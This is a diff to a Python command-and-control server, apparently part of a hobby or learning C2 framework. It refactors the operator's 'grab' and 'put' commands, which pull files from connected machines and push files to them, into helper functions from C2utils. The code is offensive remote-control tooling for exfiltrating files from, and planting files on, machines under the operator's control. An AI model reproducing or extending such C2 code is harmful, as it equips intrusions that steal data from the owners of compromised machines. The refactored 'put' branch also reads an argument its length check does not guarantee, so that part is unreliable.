@@ -3,7 +3,7 @@ import socket
 import threading
 import tqdm
 import os
-from C2utils import snd_msg, get_msg
+from C2utils import snd_msg, get_msg, snd_file, get_file
 
 r = open("../port", 'r')
 port = int(r.readline())
@@ -94,92 +94,24 @@ def handle_user():
     
         ## grab
         elif cmd_lst[0] == "grab":
+            if len(cmd_lst) != 3:
+                print("Usage: grab <filename> <ip>")
+                continue
             for data in connected_machines:
                 if data['addr'][0] == cmd_lst[2]:
-                    snd_msg(data['conn'], "grab")
-                    print(f"filename: {cmd_lst[1]}")
-                    snd_msg(data['conn'], cmd_lst[1]) ## Sending ip the file name to grab
-                    resp = get_msg(data['conn'])
-                    
-                    if resp != "SUCCESS":
-                        print(resp)
-                        continue
+                    print(get_file(data['conn'], cmd_lst[1]))
 
-                    # receive the file infos
-                    # receive using client socket, not server socket
-                    received = get_msg(data['conn'])
-                    filename, filesize = received.split(SEPARATOR)
-                    print(f'filename: {filename}, fsize: {filesize}')
-        
-                    # convert to integer
-                    filesize = int(filesize)
-
-                    # start receiving the file from the socket
-                    # and writing to the file stream
-                    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-                    bytes_left = filesize
-                    with open(filename, "wb") as f:
-                        while bytes_left > 0:
-                            if bytes_left < BUFFER_SIZE:
-                                bytes_to_write = bytes_left
-                            else:
-                                bytes_to_write = BUFFER_SIZE
-                            # read 1024 bytes from the socket (receive)
-                            bytes_read = data['conn'].recv(bytes_to_write)
-                            #print(bytes_read)
-                            bytes_left = bytes_left - bytes_to_write
-                            #print(f'Bytes left {str(bytes_left)}')
-                            # write to the file the bytes we just received
-                            f.write(bytes_read)
-                            # update the progress bar
-                            progress.update(len(bytes_read))
-                    progress.close()
-                    f.close()
          
 
         ## put
         elif cmd_lst[0] == "put":
-            new_cmd = cmd_lst[1:]
-            if len(new_cmd) < 2:
+            if len(cmd_lst) < 2:
                 print("Usage: put <filename> <ip>")
-                continue
-            sent = False
-            filename = new_cmd[0]
-            ip = new_cmd[1]
-            try:
-                filesize = os.path.getsize(filename)
-            except:
-                print(f"{filename} does not exist.")
                 continue
 
             for data in connected_machines:
-                if data['addr'][0] == ip:
-                    snd_msg(data['conn'], "put")
-                    sent = True
-                    snd_msg(data['conn'], f"{filename}{SEPARATOR}{filesize}")
-                    new_cmd = ' '.join(new_cmd[1:])
-                    print(f'Uploading \"{filename}\" to {data["addr"][0]}')
-                    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-                    bytes_left = filesize 
-
-                    with open(filename, 'rb') as f:
-                        while bytes_left > 0:
-                            # read the bytes from the file
-                            if bytes_left > BUFFER_SIZE:
-                                bytes_to_read = BUFFER_SIZE
-                            else:
-                                bytes_to_read = bytes_left
-                            bytes_read = f.read(bytes_to_read)
-                            bytes_left = bytes_left - bytes_to_read
-                            # we use sendall to assure transimission in
-                            # busy networks
-                            data['conn'].sendall(bytes_read)
-                            # update the progress bar
-                            progress.update(len(bytes_read))
-                    progress.close()
-                    f.close()
-            if not sent:
-                print(f"{ip} not connected.")
+                if data['addr'][0] == cmd_lst[2]:
+                    print(snd_file(data['conn'], cmd_lst[1]))
 
         ## Close
         elif cmd_lst[0] == "close":
